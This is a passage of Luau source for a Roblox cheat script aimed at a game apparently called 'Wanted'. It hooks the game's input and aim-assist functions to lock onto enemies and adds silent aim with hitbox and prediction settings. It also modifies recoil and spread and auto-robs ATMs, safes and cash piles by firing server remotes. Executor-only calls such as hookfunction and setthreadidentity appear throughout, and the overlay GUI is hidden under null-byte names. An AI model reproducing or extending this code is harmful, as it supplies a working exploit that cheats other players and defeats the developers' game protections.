								local v35 = arg3()

								for i = 1, #v35 do
									local v36 = v35[i]

									if fn88(v36) then
										Insert(arg, v36)
									end
								end
							end

							v34:CreateModule({
								Id = "UBG_hide_vfx",
								Name = "Hide VFX",
								Default = tbl15.HideVFX,
								Callback = function(hideVFX)
									tbl15.HideVFX = hideVFX

									fn91(tbl16, hideVFX, function()
										local tbl19 = {}

										for _, v35 in VFXHelp, nil, nil do
											if typeof(v35) == "function" then
												Insert(tbl19, v35)
											end
										end

										return tbl19
									end)
								end,
							})

							v34:CreateModule({
								Id = "UBG_hide_sound",
								Name = "Hide Sound",
								Default = tbl15.HideSound,
								Callback = function(hideSound)
									tbl15.HideSound = hideSound

									fn91(tbl17, hideSound, function()
										return fn90(sound, "play")
									end)
								end,
							})

							v34:CreateModule({
								Id = "UBG_hide_server_output",
								Name = "Hide Server Output",
								Default = tbl15.HideOutput,
								Callback = function(hideOutput)
									tbl15.HideOutput = hideOutput

									fn91(tbl18, hideOutput, function()
										return fn90(console, nil)
									end)
								end,
							})
						end,
						Wanted = function()
							local load = require(FindFirstChild(ReplicatedStorage, "Devv") or FindFirstChild(ReplicatedStorage, "devv")).load
							local nuid = load("NUID")
							local Network = load("Network")
							local MathUtil = load("MathUtil")
							local ClientPlayers = load("ClientPlayers")
							local InputHandler_ = load("InputHandler")
							local ClientSettings = load("ClientSettings")
							local ClientGizmos = require(ReplicatedStorage.Client.Wanted.Modules.ClientGizmos)
							local ClientProps = require(ReplicatedStorage.Client.Wanted.Modules.ClientProps)
							local ClientTools = require(ReplicatedStorage.Client.Wanted.Modules.ClientTools)
							local ClientData = load("ClientData")
							local CombatUtil = require(ReplicatedStorage.Shared.Wanted.Modules.CombatUtil)
							local UpgradeUtil = require(ReplicatedStorage.Shared.Wanted.Modules.UpgradeUtil)
							local Objects = require(ReplicatedStorage.Shared.Wanted.Indicies.Objects)
							local DialogUtil = require(ReplicatedStorage.Client.Core.DialogUtil)
							local SettingsData = require(ReplicatedStorage.Shared.Wanted.Indicies.SettingsData)
							local AimAssist = require(ReplicatedStorage.Client.Wanted.Objects.ClientTool.Components.Tools.Guns.AimAssist)
							local Shooter = require(ReplicatedStorage.Client.Wanted.Objects.ClientTool.Components.Tools.Guns.Shooter)
							local fireServer = Network.FireServer
							local invokeServer = Network.InvokeServer
							local userId = LocalPlayer.UserId
							local getInputType = InputHandler_.GetInputType

							local function fn68(...)
								local v27 = debug.info(2, "s")

								if type(v27) ~= "string" or v27 == "" then
									v27 = debug.info(3, "s")
								end

								if type(v27) == "string" and v27:find("AimAssist", 1, true) then
									return "Touch"
								end
								return getInputType(...)
							end

							getInputType = hookfunction
							getInputType = getInputType(InputHandler_.GetInputType, fn68)
							local assistSensitivity = SettingsData.settingDataByName and SettingsData.settingDataByName.assistSensitivity

							if type(assistSensitivity) == "table" and type(assistSensitivity.inputTypes) == "table" then
								local flag = false

								for i = 1, #assistSensitivity.inputTypes do
									if assistSensitivity.inputTypes[i] == "KeyboardAndMouse" then
										flag = true
										break
									end
								end

								if not flag then
									Insert(assistSensitivity.inputTypes, "KeyboardAndMouse")
								end
							end

							local n4 = 0.8
							local str3 = "Buzzsaw"
							local n5 = 10

							local function fn69(arg)
								local v27 = arg or LocalPlayer
								return v27 and v27.Character
							end

							local function fn70(arg)
								local v27 = fn69(arg)
								return v27 and FindFirstChildOfClass(v27, "Humanoid")
							end

							local function fn71(arg)
								local v27 = fn69(arg)
								return v27 and FindFirstChild(v27, "HumanoidRootPart")
							end

							local function fn72(arg, arg2)
								return CombatUtil.CanPlayersPVP(arg or LocalPlayer, arg2)
							end

							local function fn73(arg)
								local v27 = ClientPlayers.Get()
								if not v27 or not arg then
									return
								end
								fireServer("equip", arg)
								pcall(setthreadidentity, 2)
								v27:SetEquipped({ toolId = arg, toolState = true })
								pcall(setthreadidentity, 8)
							end

							local function fn74(arg)
								local ok4, result4 = pcall(ClientTools.GetItems)
								if not ok4 or typeof(result4) ~= "table" then
									return nil
								end

								for _, v27 in next, result4, nil do
									if typeof(v27) ~= "table" then
										continue
									end

									for k, v28 in next, v27, nil do
										if v28 and (v28.name == arg or v28.type == arg or k == arg or arg == str3 and v28.isBuzzSaw) then
											return { guid = k, data = v28 }
										end
									end
								end

								return nil
							end

							local function fn75()
								local tbl10 = { "None" }
								local tbl11 = { None = true }
								local ok4, result4 = pcall(ClientTools.GetItems)
								ok4 = ok4 and result4 and result4.Tool
								if not ok4 then
									return tbl10
								end

								for _, v27 in next, ok4, nil do
									v27 = v27 and v27.name

									if v27 and not tbl11[v27] then
										tbl11[v27] = true
										Insert(tbl10, v27)
									end
								end

								Sort(tbl10, function(arg, arg2)
									if arg == "None" then
										return true
									end

									if arg2 == "None" then
										return false
									end
									return arg < arg2
								end)

								return tbl10
							end

							local function fn76(arg)
								arg = arg and arg.UserId
								arg = arg and ClientPlayers.GetByPlayerId(arg)

								return {
									isDowned = arg and arg:IsDowned() or false,
									isCrawling = arg and arg:GetPlayerProperty("crawling") or false,
									isKnocked = arg and arg:GetPlayerProperty("knocked") or false,
									isGrabbed = arg and arg:GetPlayerProperty("grabbed") or false,
								}
							end

							local function fn77(arg)
								local tbl10 = {}
								if typeof(arg) ~= "table" then
									return tbl10
								end

								for i = 1, #arg do
									tbl10[tostring(arg[i])] = true
								end

								for k, v27 in pairs(arg) do
									if v27 == true then
										tbl10[tostring(k)] = true
									end
								end

								return tbl10
							end

							local function fn78(arg, arg2)
								if typeof(arg) ~= "table" then
									return arg == arg2
								end

								if Find(arg, arg2) ~= nil then
									return true
								end

								for i = 1, #arg do
									local v27 = arg[i]
									if typeof(v27) == "table" and (v27.Title == arg2 or v27.Value == arg2 or v27[1] == arg2) then
										return true
									end
								end

								return arg[arg2] == true or arg[tostring(arg2)] == true
							end

							local function fn79(arg)
								local tbl10 = {}
								local ok4, result4 = pcall(debug.getupvalue, ClientGizmos.Get, 1)
								if not ok4 or typeof(result4) ~= "table" then
									return tbl10
								end

								for k, v27 in next, result4, nil do
									if k and typeof(v27) == "table" and v27.position then
										v27.objectId = v27.objectId or k
										v27.dist = arg and (arg.Position - v27.position).Magnitude or math.huge
										Insert(tbl10, v27)
									end
								end

								Sort(tbl10, function(arg2, arg3)
									return arg2.dist < arg3.dist
								end)

								return tbl10
							end

							local function fn80()
								local v27 = fn71()
								local tbl10 = {}
								local v28 = GetClosest()

								for i = 1, #v28 do
									local v29 = v28[i]

									if v29 ~= LocalPlayer and CheckState(v29) then
										local v30 = fn69(v29)
										local v31 = fn70(v29)
										local v32 = fn71(v29)
										local v33 = v30 and FindFirstChild(v30, "Head")

										if v30 and v31 and v31.Health > 0 and v32 and v33 then
											Insert(tbl10, {
												plr = v29,
												char = v30,
												hum = v31,
												hrp = v32,
												head = v33,
												dist = v27 and (v27.Position - v32.Position).Magnitude or math.huge,
											})
										end
									end
								end

								return tbl10
							end

							local function fn81(arg)
								if typeof(arg) ~= "table" then
									return false
								end

								if arg.isCurrency == true then
									return true
								end
								local gizmoType = arg.gizmoType
								return gizmoType == "Cash" or gizmoType == "CashPallet" or gizmoType == "MainCashPile"
							end

							local function fn82(arg)
								if typeof(arg) ~= "table" then
									return nil
								end
								local cashLeft = arg.cashLeft
								if type(cashLeft) == "number" then
									return cashLeft
								end
								local gizmoState = arg.gizmoState
								gizmoState = gizmoState and gizmoState.amount
								if type(gizmoState) == "number" then
									return gizmoState
								end
								return nil
							end

							local function fn83(arg)
								if typeof(arg) ~= "table" then
									return false
								end
								local gizmoType = arg.gizmoType

								if gizmoType == "ATM" or gizmoType == "Register" then
									local v27 = ClientPlayers.Get()

									if v27 and arg.position then
										pcall(function()
											v27:Melee(arg.position)
										end)

										return true
									end

									return false
								end

								if gizmoType == "WorldSafe" or gizmoType == "GasStationSafe" then
									if arg.objectId then
										fireServer("gizmoInteraction", arg.objectId, "OpenSafe")
										return true
									end
									return false
								end

								if gizmoType == "PC Block" then
									if arg.objectId then
										fireServer("gizmoInteraction", arg.objectId, "Search")
										return true
									end
									return false
								end

								if fn81(arg) then
									if not arg.objectId then
										return false
									end
									local v27 = table.create((gizmoType == "CashPallet" or gizmoType == "MainCashPile") and 10 or 1, arg.objectId)
									pcall(invokeServer, "collectCurrency", v27)
									return true
								end

								if typeof(arg.AttemptCollect) == "function" then
									pcall(arg.AttemptCollect, arg)
									return true
								end

								if typeof(arg.Interact) == "function" then
									pcall(arg.Interact, arg)
									return true
								end
								return false
							end

							local function fn84(arg)
								if typeof(arg) ~= "table" or not arg.gizmoType then
									return false
								end
								local gizmoState = arg.gizmoState

								if gizmoState then
									if gizmoState.broken or gizmoState.searched or gizmoState.robbed or gizmoState.used or gizmoState.isDestroyed then
										return false
									end
								end

								if arg.broken or arg.searched or arg.robbed or arg.isCollected then
									return false
								end

								if fn81(arg) then
									local v27 = fn82(arg)
									if v27 ~= nil and v27 <= 0 then
										return false
									end
									return arg.objectId ~= nil
								end

								if typeof(arg.AttemptCollect) == "function" or typeof(arg.Interact) == "function" then
									return true
								end
								local gizmoType = arg.gizmoType
								return gizmoType == "ATM" or gizmoType == "Register" or gizmoType == "PC Block" or gizmoType == "WorldSafe" or gizmoType == "GasStationSafe"
							end

							local function fn85(arg)
								if typeof(arg) ~= "table" then
									return false
								end
								local properties = arg.properties
								if not (arg.isJewelry or properties and properties.source == "JewelSpawn") then
									return false
								end
								local gizmoState = arg.gizmoState
								return gizmoState ~= nil and gizmoState.disabled == true
							end

							local function fn86(arg, arg2)
								if not arg or typeof(ClientProps.worldPropsById) ~= "table" then
									return nil, nil
								end
								local v27 = nil

								for _, v28 in next, ClientProps.worldPropsById, nil do
									if typeof(v28) == "table" and v28.name == "JewelSpawn" and not v28.isShattered then
										local position = v28.GetPosition and v28:GetPosition() or v28.model and v28.model.PrimaryPart and v28.model.PrimaryPart.Position

										if position then
											local magnitude = (arg.Position - position).Magnitude

											if magnitude < arg2 then
												arg2 = magnitude
												v27 = v28
											end
										end
									end
								end

								return v27, arg2
							end

							local function fn87(arg)
								if typeof(arg) ~= "table" or arg.isShattered then
									return false
								end
								local Buzzsaw = fn74("Buzzsaw")
								if not Buzzsaw then
									return false
								end
								fn73(Buzzsaw.guid)
								local v27 = ClientPlayers.Get()
								local position = arg.GetPosition and arg:GetPosition() or arg.model and arg.model.PrimaryPart and arg.model.PrimaryPart.Position
								if not v27 or not position then
									return false
								end

								pcall(function()
									v27:Melee(position)
								end)

								return true
							end

							local function fn88()
								local ok4, result4 = pcall(ClientData.Get)
								if not ok4 or typeof(result4) ~= "table" or typeof(result4.bag) ~= "table" then
									return 0
								end
								local contents = result4.bag.contents
								local n6 = 0

								if typeof(contents) == "table" then
									for _, v27 in next, contents, nil do
										if typeof(v27) == "string" and v27 ~= "" then
											local v28 = Objects.GetDataProperty(v27, "weight")

											if type(v28) == "number" then
												n6 += v28
											end
										end
									end
								end

								local capacity = UpgradeUtil.GetBagCapacity()

								if type(capacity) ~= "number" or capacity <= 0 then
									capacity = type(result4.bag.capacity) == "number" and result4.bag.capacity or 1
								end

								return n6 / capacity
							end

							local function fn89()
								if GetAttribute(LocalPlayer, "isBagFull") then
									return true
								end

								if not GetAttribute(LocalPlayer, "hasLootBag") then
									return false
								end
								return fn88() >= n4
							end

							local v27 = v14:CreateTab({ Id = "wanted-legit", Name = "Legit" })

							local function fn90()
								local assistSensitivity2 = SettingsData.settingDataByName and SettingsData.settingDataByName.assistSensitivity
								local flag = type(assistSensitivity2) == "table" and type(assistSensitivity2.defaultValue) == "number"
								local n6 = 1

								if flag then
									n6 = assistSensitivity2.defaultValue
								end

								local ok4, result4 = pcall(function()
									return ClientSettings.Get("assistSensitivity")
								end)

								if not (ok4 and type(result4) == "number") then
									result4 = n6
								end

								local tbl10 = {}

								tbl10.AimAssist = {
									Module = nil,
									Enabled = false,
									UseFov = true,
									Fov = 45,
									FovColor = NewColor3(1, 1, 1),
									SpeedX = result4 > 0 and result4 or 2.7,
									SpeedY = 1,
									PredictionX = 2.8,
									PredictionY = 2.6,
									Range = 300,
									Part = "Body",
									Animation = "Linear",
								}

								tbl10.SilentAim = {
									Module = nil,
									Enabled = false,
									Fov = 10,
									HitChance = 50,
									Accuracy = 70,
									PointScale = 62,
									Priority = "Closest",
									Hitboxes = { Head = true, Body = true, Arms = true, Legs = true },
									PredictionX = 1.7,
									PredictionY = 1.1,
									VisualizeFov = false,
									IgnoreDowned = true,
								}

								tbl10.GunMod = { Enabled = false, Recoil = 100, Spread = 100, BulletSpeed = 1, BulletLifetime = 1 }

								local function fn91(arg)
									return fn76(arg).isDowned == true
								end

								local function fn92(defaultValue)
									local assistSensitivity3 = SettingsData.settingDataByName and SettingsData.settingDataByName.assistSensitivity

									if type(assistSensitivity3) == "table" then
										assistSensitivity3.defaultValue = defaultValue
									end

									pcall(function()
										if type(ClientSettings.Set) == "function" then
											ClientSettings.Set("assistSensitivity", defaultValue)
										elseif type(ClientSettings.RetriggerUpdateCallback) == "function" then
											ClientSettings.RetriggerUpdateCallback("assistSensitivity", defaultValue)
										end
									end)
								end

								local v28 = Tan(Rad(35))
								local thickness = 1
								local transparency = 0.5
								local n7 = 0.032
								local n8 = 1000
								local n9 = 0.36
								local n10 = 0.9
								local v29 = nil
								local v30 = nil
								local v31 = nil
								local v32 = nil
								local v33 = nil
								local v34 = nil
								local v35 = nil
								local v36 = nil

								local tbl11 = {
									MaxTargets = 64,
									Count = 0,
									LosParams = NewRayParams(),
									LosFilter = { nil, nil },
									LosReady = false,
									FovLastShow = false,
									FovLastX = 0,
									FovLastY = 0,
									FovLastDiam = 0,
									FovLastColor = nil,
								}

								tbl11.LosParams.FilterType = Enum.RaycastFilterType.Exclude
								tbl11.LosParams.IgnoreWater = true
								local step = AimAssist.Step

								pcall(function()
									local hui = typeof(gethui) == "function" and gethui() or CoreGui
									local ScreenGui = NewInstance("ScreenGui")
									ScreenGui.Name = "\0"
									ScreenGui.IgnoreGuiInset = true
									ScreenGui.ResetOnSpawn = false
									ScreenGui.DisplayOrder = 10
									ScreenGui.Parent = hui
									local Frame = NewInstance("Frame")
									Frame.Name = "\0"
									Frame.BackgroundTransparency = 1
									Frame.AnchorPoint = NewVector2(0.5, 0.5)
									Frame.BorderSizePixel = 0
									Frame.Visible = false
									Frame.Parent = ScreenGui
									local UICorner = NewInstance("UICorner")
									UICorner.CornerRadius = NewUDim(1, 0)
									UICorner.Parent = Frame
									local UIStroke = NewInstance("UIStroke")
									UIStroke.Thickness = thickness
									UIStroke.Transparency = transparency
									UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
									UIStroke.Parent = Frame
									v29 = ScreenGui
									v30 = Frame
									v31 = UIStroke
								end)

								local function fn93(arg)
									local viewportSize = arg.ViewportSize
									if UserInputService.TouchEnabled then
										return viewportSize.X * 0.5, viewportSize.Y * 0.5
									end
									local v37 = MouseLocation()
									return v37.X, v37.Y
								end

								local function fn94(arg, arg2)
									local v37 = Clamp((arg2 or 0) * 0.5, 0, 89)
									arg = arg and arg.ViewportSize.Y or 0
									if arg < 1 then
										return 0
									end
									return arg * 0.5 * Tan(Rad(v37)) / v28
								end

								local function fn95()
									if v32 then
										Disconnect(v32)
										v32 = nil
									end

									if v30 and v30.Visible then
										v30.Visible = false
									end

									tbl11.FovLastShow = false
								end

								local function fn96()
									fn95()
									if not v30 or not v31 then
										return
									end

									local function fn97()
										local v37 = tbl11
										local aimAssist = tbl10.AimAssist
										local v38 = Camera()
										local fovLastShow = (aimAssist.Module == nil or aimAssist.Module:Get() == true) and aimAssist.UseFov == true and v38 ~= nil

										if v37.FovLastShow ~= fovLastShow then
											v37.FovLastShow = fovLastShow
											v30.Visible = fovLastShow
										end

										if not fovLastShow then
											return
										end
										local v39, v40 = fn93(v38)
										local v41 = Max(2, Floor(fn94(v38, aimAssist.Fov) * 2 + 0.5))
										local fovColor = aimAssist.FovColor or White

										if v37.FovLastColor ~= fovColor then
											v37.FovLastColor = fovColor
											v31.Color = fovColor
											v31.Transparency = transparency
										end

										if v37.FovLastX ~= v39 or v37.FovLastY ~= v40 then
											v37.FovLastX = v39
											v37.FovLastY = v40
											v30.Position = NewUDim2(0, v39, 0, v40)
										end

										if v37.FovLastDiam ~= v41 then
											v37.FovLastDiam = v41
											v30.Size = NewUDim2(0, v41, 0, v41)
										end
									end

									fn97()
									v32 = Connect(RunService.RenderStepped, fn97)
								end

								local function fn97(arg)
									local v37 = v33[7][v33[6] + arg]
									if not v37 then
										return nil
									end
									local part = tbl10.AimAssist.Part
									local v38 = v34[7][v34[6] + arg]
									local v39 = v35[7][v35[6] + arg]
									local v40 = v36[7][v36[6] + arg]

									if part == "Head" then
										if v38 and v38.Parent then
											return v38
										end
									elseif part == "Body" then
										if v39 and v39.Parent then
											return v39
										end

										if v40 and v40.Parent then
											return v40
										end
									end

									if v39 and v39.Parent then
										return v39
									end

									if v38 and v38.Parent then
										return v38
									end
									return v37.PrimaryPart
								end

								local function fn98(...) end

								local function fn99(arg, arg2, arg3, arg4)
									local v37 = tbl11

									if not v37.LosReady or v37.LosFilter[1] ~= arg4 then
										v37.LosReady = true
										v37.LosFilter[1] = arg4
										v37.LosFilter[2] = FindFirstChild(workspace, "Local")
										v37.LosParams.FilterDescendantsInstances = v37.LosFilter
									end

									local n11 = arg2 - arg
									local magnitude = n11.Magnitude
									if magnitude <= 0.25 then
										return true
									end
									local losParams = v37.LosParams
									local v38 = RaycastWorkspace(arg, n11.Unit * Min(magnitude, 1500), losParams)
									return not v38 or v38.Instance and IsDescendantOf(v38.Instance, arg3)
								end

								local function fn100(arg, arg2, arg3, arg4, arg5)
									arg2 = arg2 or EmptyVector3
									local n11 = n7 + arg3 / n8 * n9
									return arg + NewVector3(arg2.X * arg4, arg2.Y * arg5, arg2.Z * arg4) * n11 * n10
								end

								local function fn101()
									local animation = tbl10.AimAssist.Animation
									local flag2 = type(animation) == "string" and Enum.EasingStyle[animation]
									if typeof(flag2) == "EnumItem" then
										return flag2
									end
									return Enum.EasingStyle.Linear
								end

								local function fn102(arg, arg2)
									if arg < 0 then
										arg = 0
									elseif arg > 1 then
										arg = 1
									end

									return TweenService:GetValue(arg, arg2, Enum.EasingDirection.InOut)
								end

								local function fn103(arg, arg2, arg3)
									if arg2 == Enum.EasingStyle.Linear then
										return arg
									end
									local num = tonumber(arg3)

									if not num or num <= 0 then
										num = 0.016666666666666666
									end

									return fn102(Clamp(arg * 10 * num, 0, 1), arg2)
								end

								local function step2(arg, arg2)
									arg = arg and arg.tool
									local toolState = arg and arg.toolState
									local flag2 = not toolState

									if not flag2 then
										flag2 = (toolState.ammo or 0) <= 0
									end

									if flag2 then
										return
									end
									local v37 = fn69()
									local v38 = fn71()
									local v39 = Camera()
									if not (v37 and v38 and v39) then
										return
									end
									local cFrame = v39.CFrame
									local position = cFrame.Position
									local viewportSize = v39.ViewportSize
									local v40, v41 = fn93(v39)
									local v42 = fn94(v39, tbl10.AimAssist.Fov)
									local v43 = Huge
									local useFov = tbl10.AimAssist.UseFov
									local range = tbl10.AimAssist.Range
									local predictionX = tbl10.AimAssist.PredictionX
									local predictionY = tbl10.AimAssist.PredictionY
									local v44 = Max(1, Min(viewportSize.X, viewportSize.Y) * 0.5)
									local n11 = nil
									local n12 = nil

									for i = 1, fn98() do
										local v45 = v33[7][v33[6] + i]
										local primaryPart = fn97(i) or v34[7][v34[6] + i]

										if (not primaryPart or not primaryPart.Parent) and v45 then
											primaryPart = v45.PrimaryPart
										end

										if primaryPart and primaryPart.Parent then
											local position2 = primaryPart.Position
											local v46 = LocalPlayer:DistanceFromCharacter(position2)

											if v46 <= range then
												local v47 = fn100(position2, primaryPart.AssemblyLinearVelocity or primaryPart.Velocity or EmptyVector3, v46, predictionX, predictionY)
												local v48 = PointToObjectSpace(cFrame, v47)
												local magnitude = v48.Magnitude

												if magnitude > 0.35 then
													local n13 = 1 / magnitude
													local n14 = v48.X * n13
													local n15 = v48.Y * n13
													local n16 = -v48.Z * n13

													if n16 > 0.02 then
														local v49, v50, v51, v52 = WorldToViewport(v47)

														if v51 > 0.05 then
															local n17 = v49 - v40
															local n18 = v50 - v41
															local v53 = Sqrt(n17 * n17 + n18 * n18)

															if not useFov or v53 <= v42 then
																if not v52 then
																	v53 += 400
																end

																local n19 = (v53 / v44) ^ 2 * 1.55 + (v46 / Max(1, range)) ^ 2 * 0.35

																if n19 < v43 and fn99(position, position2, v45, v37) then
																	local v54 = ToRad
																	n11 = Atan2(n14, n16) / v54
																	local v55 = ToRad
																	n12 = Atan2(n15, n16) / v55
																	v43 = n19
																end
															end
														end
													end
												end
											end
										end
									end

									if not n11 then
										return
									end
									local n13 = 1

									if arg then
										n13 = arg.GetData and arg:GetData()
										n13 = n13 and n13.aimAssistMod or arg.aimAssistMod or 1
									end

									local v45 = fn101()
									local v46 = fn103(tbl10.AimAssist.SpeedX * n13, v45, arg2)
									local v47 = fn103(tbl10.AimAssist.SpeedY * n13, v45, arg2)
									local n14 = GetAttribute(LocalPlayer, "xAngle") or 0
									local v48 = Clamp((GetAttribute(LocalPlayer, "yAngle") or 0) + n12 * v47, -80, 80)
									SetAttribute(LocalPlayer, "xAngle", (n14 - n11 * v46) % 360)
									SetAttribute(LocalPlayer, "yAngle", v48)
								end

								tbl10.AimAssist.Module = v27:CreateModule({
									Id = "wanted-aim-assist",
									Name = "AimAssist",
									Default = false,
									Callback = function(arg)
										tbl10.AimAssist.Enabled = arg == true

										if arg then
											AimAssist.Step = step2
											fn96()
										else
											AimAssist.Step = step
											fn95()
										end
									end,
								})

								tbl10.AimAssist.Module:CreateSelector({
									Id = "wanted-aim-assist-part",
									Name = "Part",
									Options = { { Value = "Head" }, { Value = "Body" } },
									Default = tbl10.AimAssist.Part,
									Callback = function(part)
										tbl10.AimAssist.Part = part
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-x-speed",
									Name = "X Speed",
									Min = 0.1,
									Max = 5,
									Default = tbl10.AimAssist.SpeedX,
									Step = 0.1,
									Callback = function(speedX)
										tbl10.AimAssist.SpeedX = speedX
										fn92(speedX)
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-y-speed",
									Name = "Y Speed",
									Min = 0.1,
									Max = 5,
									Default = tbl10.AimAssist.SpeedY,
									Step = 0.1,
									Callback = function(speedY)
										tbl10.AimAssist.SpeedY = speedY
									end,
								})

								tbl10.AimAssist.Module:CreateSelector({
									Id = "wanted-aim-assist-animation",
									Name = "Animation",
									Options = {
										{ Value = "Linear" },
										{ Value = "Sine" },
										{ Value = "Quad" },
										{ Value = "Cubic" },
										{ Value = "Quart" },
										{ Value = "Quint" },
										{ Value = "Exponential" },
										{ Value = "Circular" },
										{ Value = "Back" },
										{ Value = "Bounce" },
										{ Value = "Elastic" },
									},
									Default = tbl10.AimAssist.Animation,
									Callback = function(animation)
										tbl10.AimAssist.Animation = animation
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-prediction-x",
									Name = "Prediction X",
									Min = 0,
									Max = 7,
									Default = tbl10.AimAssist.PredictionX,
									Step = 0.01,
									Callback = function(predictionX)
										tbl10.AimAssist.PredictionX = predictionX
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-prediction-y",
									Name = "Prediction Y",
									Min = 0,
									Max = 7,
									Default = tbl10.AimAssist.PredictionY,
									Step = 0.01,
									Callback = function(predictionY)
										tbl10.AimAssist.PredictionY = predictionY
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-range",
									Name = "Range",
									Min = 10,
									Max = 1000,
									Default = tbl10.AimAssist.Range,
									Step = 1,
									Callback = function(range)
										tbl10.AimAssist.Range = range
									end,
								})

								local v37 = tbl10.AimAssist.Module:CreateToggle({
									Id = "wanted-aim-assist-use-fov",
									Name = "Use Fov",
									Default = tbl10.AimAssist.UseFov,
									Callback = function(arg)
										tbl10.AimAssist.UseFov = arg == true
									end,
								})

								tbl10.AimAssist.Module:CreateSlider({
									Id = "wanted-aim-assist-fov",
									Name = "Fov",
									Min = 1,
									Max = 180,
									Default = tbl10.AimAssist.Fov,
									Step = 0.1,
									Nested = true,
									Parent = v37,
									Callback = function(fov)
										tbl10.AimAssist.Fov = fov
									end,
								})

								tbl10.AimAssist.Module:CreateColorPicker({
									Id = "wanted-aim-assist-fov-color",
									Name = "Color",
									Default = tbl10.AimAssist.FovColor,
									Nested = true,
									Parent = v37,
									Callback = function(fovColor)
										tbl10.AimAssist.FovColor = fovColor
									end,
								})

								local function fn104()
									local tbl12 = {
										Head = { "Head" },
										Body = { "UpperTorso", "LowerTorso", "Torso", "HumanoidRootPart" },
										Arms = { "LeftUpperArm", "RightUpperArm", "LeftLowerArm", "RightLowerArm", "Left Arm", "Right Arm" },
										Legs = { "LeftUpperLeg", "RightUpperLeg", "LeftLowerLeg", "RightLowerLeg", "Left Leg", "Right Leg" },
									}

									local tbl13 = { Head = "Head", Body = "UpperTorso" }

									local tbl14 = {
										Head = NewVector3(1, 1, 1),
										Torso = NewVector3(2, 2, 1),
										UpperTorso = NewVector3(2, 2, 1),
										LowerTorso = NewVector3(2, 2, 1),
										HumanoidRootPart = NewVector3(2, 2, 1),
										["Left Arm"] = NewVector3(1, 2, 1),
										["Right Arm"] = NewVector3(1, 2, 1),
										LeftUpperArm = NewVector3(1, 2, 1),
										RightUpperArm = NewVector3(1, 2, 1),
										LeftLowerArm = NewVector3(1, 2, 1),
										RightLowerArm = NewVector3(1, 2, 1),
										["Left Leg"] = NewVector3(1, 2, 1),
										["Right Leg"] = NewVector3(1, 2, 1),
										LeftUpperLeg = NewVector3(1, 2, 1),
										RightUpperLeg = NewVector3(1, 2, 1),
										LeftLowerLeg = NewVector3(1, 2, 1),
										RightLowerLeg = NewVector3(1, 2, 1),
										Head_Hitbox = NewVector3(1, 1, 1),
									}

									local n11 = 0.05
									local n12 = 24
									local v38 = nil

									local tbl15 = {
										CachedPart = nil,
										ScanAccum = 0,
										ScanConn = nil,
										FovConn = nil,
										OldShoot = nil,
										Hooked = false,
										SelCount = 0,
										BestPart = nil,
										BestAngle = 360,
										PriPart = nil,
										PriAngle = 360,
										FovLastShow = false,
										FovLastX = 0,
										FovLastY = 0,
										FovLastDiam = 0,
									}

									local v39 = nil
									local v40 = nil

									pcall(function()
										local hui = typeof(gethui) == "function" and gethui() or CoreGui
										local ScreenGui = NewInstance("ScreenGui")
										ScreenGui.Name = "\0"
										ScreenGui.IgnoreGuiInset = true
										ScreenGui.ResetOnSpawn = false
										ScreenGui.DisplayOrder = 11
										ScreenGui.Parent = hui
										local Frame = NewInstance("Frame")
										Frame.Name = "\0"
										Frame.BackgroundTransparency = 1
										Frame.AnchorPoint = NewVector2(0.5, 0.5)
										Frame.BorderSizePixel = 0
										Frame.Visible = false
										Frame.Parent = ScreenGui
										local UICorner = NewInstance("UICorner")
										UICorner.CornerRadius = NewUDim(1, 0)
										UICorner.Parent = Frame
										local UIStroke = NewInstance("UIStroke")
										UIStroke.Thickness = thickness
										UIStroke.Transparency = transparency
										UIStroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
										UIStroke.Color = NewColor3(1, 1, 1)
										UIStroke.Parent = Frame
										v39 = Frame
										v40 = UIStroke
									end)

									local function fn105()
										local hitboxes = tbl10.SilentAim.Hitboxes
										local selCount = 0

										if hitboxes.Head then
											v38[7][v38[6] + 1] = "Head"
											selCount = 1
										end

										if hitboxes.Body then
											selCount += 1
											v38[7][v38[6] + selCount] = "Body"
										end

										if hitboxes.Arms then
											selCount += 1
											v38[7][v38[6] + selCount] = "Arms"
										end

										if hitboxes.Legs then
											selCount += 1
											v38[7][v38[6] + selCount] = "Legs"
										end

										tbl15.SelCount = selCount
										return selCount
									end

									local v41

									local function fn106(arg)
										local n13 = 0
										local selCount = tbl15.SelCount
										if not arg or selCount < 1 then
											return 0
										end

										local function fn107(arg2)
											if arg2 and IsA(arg2, "BasePart") then
												n13 += 1
												v41[7][v41[6] + n13] = arg2
												return n13 >= n12
											end

											return false
										end

										for i = 1, selCount do
											local v42 = tbl12[v38[7][v38[6] + i]]

											if v42 then
												for i2 = 1, #v42 do
													if fn107(FindFirstChild(arg, v42[i2])) then
														return n13
													end
												end
											end
										end

										local v42 = FindFirstChild(arg, "Hitbox")

										if v42 then
											if tbl10.SilentAim.Hitboxes.Head then
												if fn107(FindFirstChild(v42, "Head_Hitbox")) then
													return n13
												end
											end

											if tbl10.SilentAim.Hitboxes.Body then
												local v43 = GetChildren(v42)

												for i = 1, #v43 do
													local v44 = v43[i]
													if v44.Name ~= "Head_Hitbox" and fn107(v44) then
														return n13
													end
												end
											end
										end

										return n13
									end

									local function fn107(arg, arg2)
										if not arg then
											return EmptyVector3
										end

										if not arg2 or arg2 <= 0 then
											return arg.Position
										end
										local n13 = arg2 / 200
										local v42 = tbl14[arg.Name] or NewVector3(1, 2, 1)
										local position = arg.Position
										local v43 = NewVector3
										local x = v42.X
										local n14 = (Random() * 2 - 1) * x * n13
										local y = v42.Y
										local z = v42.Z
										return position + v43(n14, (Random() * 2 - 1) * y * n13, (Random() * 2 - 1) * z * n13)
									end

									local function fn108(arg, arg2)
										local silentAim = tbl10.SilentAim
										local v42 = fn107(arg, silentAim.PointScale)
										local magnitude = LocalPlayer:DistanceFromCharacter(v42)

										if not magnitude or magnitude <= 0 then
											magnitude = (v42 - arg2).Magnitude
										end

										return fn100(v42, arg.AssemblyLinearVelocity or arg.Velocity or EmptyVector3, magnitude, silentAim.PredictionX, silentAim.PredictionY)
									end

									local function fn109(arg, arg2, arg3)
										if arg == LocalPlayer or not arg2 or not arg3 or arg3.Health <= 0 then
											return false
										end

